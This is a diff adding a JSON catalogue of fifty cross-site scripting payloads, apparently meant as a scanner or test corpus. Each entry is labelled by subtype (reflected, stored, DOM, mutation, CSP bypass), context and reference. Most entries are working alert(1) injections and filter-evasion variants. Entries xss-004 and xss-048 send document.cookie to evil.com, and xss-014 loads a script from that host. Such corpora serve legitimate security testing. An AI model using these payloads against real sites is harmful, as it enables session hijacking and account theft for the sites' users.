@@ -1,0 +1,502 @@
+[
+  {
+    "id": "xss-001",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<script>alert(1)</script>",
+    "context": "html",
+    "description": "Basic reflected XSS with script tag",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-002",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<img src=x onerror=alert(1)>",
+    "context": "html",
+    "description": "XSS using image tag with onerror handler",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-003",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<svg onload=alert(1)>",
+    "context": "html",
+    "description": "XSS using SVG onload event",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-004",
+    "family": "xss",
+    "subtype": "stored",
+    "payload_string": "<script>document.location='http://evil.com/?c='+document.cookie</script>",
+    "context": "html",
+    "description": "Stored XSS for cookie exfiltration",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-005",
+    "family": "xss",
+    "subtype": "dom",
+    "payload_string": "#<script>alert(1)</script>",
+    "context": "url_fragment",
+    "description": "DOM-based XSS via URL fragment injection",
+    "references": ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-006",
+    "family": "xss",
+    "subtype": "dom",
+    "payload_string": "javascript:alert(1)",
+    "context": "url",
+    "description": "DOM XSS via javascript: URI scheme",
+    "references": ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-007",
+    "family": "xss",
+    "subtype": "mxss",
+    "payload_string": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "context": "html",
+    "description": "Mutation XSS bypassing basic filters",
+    "references": ["https://cure53.de/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-008",
+    "family": "xss",
+    "subtype": "csp_bypass",
+    "payload_string": "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
+    "context": "html",
+    "description": "CSP bypass using HTML import with data URI",
+    "references": ["https://csp-evaluator.withgoogle.com/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-009",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<body onload=alert(1)>",
+    "context": "html",
+    "description": "XSS using body onload event",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-010",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<iframe src='javascript:alert(1)'>",
+    "context": "html",
+    "description": "XSS using iframe with javascript: URI",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-011",
+    "family": "xss",
+    "subtype": "stored",
+    "payload_string": "<details open ontoggle=alert(1)>",
+    "context": "html",
+    "description": "Stored XSS using details element toggle event",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-012",
+    "family": "xss",
+    "subtype": "dom",
+    "payload_string": "';alert(1)//",
+    "context": "javascript_string",
+    "description": "DOM XSS breaking out of JavaScript string context",
+    "references": ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-013",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "\"><script>alert(1)</script>",
+    "context": "attribute",
+    "description": "XSS breaking out of HTML attribute context",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-014",
+    "family": "xss",
+    "subtype": "csp_bypass",
+    "payload_string": "<script src='//evil.com/xss.js'></script>",
+    "context": "html",
+    "description": "CSP bypass using protocol-relative script URL",
+    "references": ["https://csp-evaluator.withgoogle.com/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-015",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "{{constructor.constructor('alert(1)')()}}",
+    "context": "template",
+    "description": "XSS via template expression injection",
+    "references": ["https://portswigger.net/web-security/cross-site-scripting/contexts"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-016",
+    "family": "xss",
+    "subtype": "dom",
+    "payload_string": "javascript:void(document.domain='evil.com')",
+    "context": "url",
+    "description": "DOM-based XSS for domain manipulation",
+    "references": ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-017",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+    "context": "html",
+    "description": "Polyglot XSS payload using nested HTML elements",
+    "references": ["https://portswigger.net/research/xss-venom"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-018",
+    "family": "xss",
+    "subtype": "mxss",
+    "payload_string": "<a href=`-javascript:'angle-bracket-encoding-bypass`>click</a>",
+    "context": "html",
+    "description": "mXSS via template literal injection in anchor tag",
+    "references": ["https://cure53.de/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-019",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "' onmouseover='alert(1)",
+    "context": "attribute",
+    "description": "XSS via attribute injection with single quotes",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-020",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "\" onmouseover=\"alert(1)",
+    "context": "attribute",
+    "description": "XSS via attribute injection with double quotes",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-021",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<input onfocus=alert(1) autofocus>",
+    "context": "html",
+    "description": "XSS using input onfocus with autofocus",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-022",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<video src=x onerror=alert(1)>",
+    "context": "html",
+    "description": "XSS using video tag onerror",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-023",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "\";alert(1)//",
+    "context": "javascript_string",
+    "description": "XSS breaking out of JS double-quote string",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-024",
+    "family": "xss",
+    "subtype": "dom",
+    "payload_string": "#<img src=x onerror=alert(1)>",
+    "context": "url_fragment",
+    "description": "DOM-XSS via location.hash with img onerror",
+    "references": ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-025",
+    "family": "xss",
+    "subtype": "dom",
+    "payload_string": "#<svg onload=alert(1)>",
+    "context": "url_fragment",
+    "description": "DOM-XSS via location.hash with SVG",
+    "references": ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-026",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "%3Cscript%3Ealert(1)%3C/script%3E",
+    "context": "html",
+    "description": "URL-encoded XSS payload for filter bypass",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-027",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "&#60;script&#62;alert(1)&#60;/script&#62;",
+    "context": "html",
+    "description": "HTML entity encoded XSS for double-decode bypass",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-028",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<svg><script>alert(1)</script></svg>",
+    "context": "html",
+    "description": "XSS using SVG namespace with script tag",
+    "references": ["https://portswigger.net/research/xss-venom"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-029",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "\"><img src=x onerror=alert(1)>",
+    "context": "attribute",
+    "description": "XSS breaking out of attribute with img",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-030",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "'+alert(1)+'",
+    "context": "javascript_string",
+    "description": "XSS JS string concatenation injection",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-031",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<object data=\"javascript:alert(1)\">",
+    "context": "html",
+    "description": "XSS using object data attribute with JS URI",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-032",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<embed src=\"javascript:alert(1)\">",
+    "context": "html",
+    "description": "XSS using embed with JS URI",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-033",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<marquee onstart=alert(1)>",
+    "context": "html",
+    "description": "XSS using marquee onstart event",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-034",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<a href=\"javascript:alert(1)\">click</a>",
+    "context": "html",
+    "description": "XSS via javascript: href on anchor tag",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-035",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<form><button formaction=javascript:alert(1)>X",
+    "context": "html",
+    "description": "XSS using button formaction attribute with JS URI",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-036",
+    "family": "xss",
+    "subtype": "dom",
+    "payload_string": "\" onhashchange=\"alert(1)",
+    "context": "attribute",
+    "description": "DOM-XSS via hashchange event handler in attribute",
+    "references": ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-037",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+    "context": "html",
+    "description": "XSS using fromCharCode encoding to evade filters",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-038",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "`+alert(1)+`",
+    "context": "javascript_string",
+    "description": "XSS using JS template literal for string escape",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-039",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<img src=\"x\" onerror=\"this.onerror=null;alert(1)\">",
+    "context": "html",
+    "description": "XSS with self-nullifying onerror to avoid repeated triggers",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-040",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<script>setTimeout(alert,0,1)</script>",
+    "context": "html",
+    "description": "XSS using setTimeout with alert as callback",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-041",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<img src onerror=alert(1)>",
+    "context": "html",
+    "description": "XSS using empty src attribute to trigger onerror",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-042",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<ScRiPt>alert(1)</sCrIpT>",
+    "context": "html",
+    "description": "XSS with mixed case to bypass case-sensitive filters",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-043",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<script/src=data:,alert(1)>",
+    "context": "html",
+    "description": "XSS using script with data URI src",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-044",
+    "family": "xss",
+    "subtype": "dom",
+    "payload_string": "<img src=x onerror=window['alert'](1)>",
+    "context": "html",
+    "description": "DOM-XSS using window property access to bypass CSP",
+    "references": ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-045",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<iframe srcdoc=\"<script>alert(1)</script>\">",
+    "context": "html",
+    "description": "XSS using iframe srcdoc attribute",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-046",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": " onfocus=alert(1) autofocus x=",
+    "context": "attribute",
+    "description": "XSS by injecting event handlers inside attribute value",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-047",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "\"><svg onload=alert(1)>",
+    "context": "attribute",
+    "description": "Break attribute context with SVG onload",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-048",
+    "family": "xss",
+    "subtype": "stored",
+    "payload_string": "<script>new Image().src='http://evil.com/?cookie='+encodeURIComponent(document.cookie)</script>",
+    "context": "html",
+    "description": "Stored XSS for cookie theft via image beacon",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-049",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<isindex action=javascript:alert(1) type=submit>",
+    "context": "html",
+    "description": "XSS via isindex element (legacy)",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  },
+  {
+    "id": "xss-050",
+    "family": "xss",
+    "subtype": "reflected",
+    "payload_string": "<table background=javascript:alert(1)>",
+    "context": "html",
+    "description": "XSS using table background attribute with JS URI",
+    "references": ["https://owasp.org/www-community/attacks/xss/"],
+    "platform_specific": {}
+  }
+]
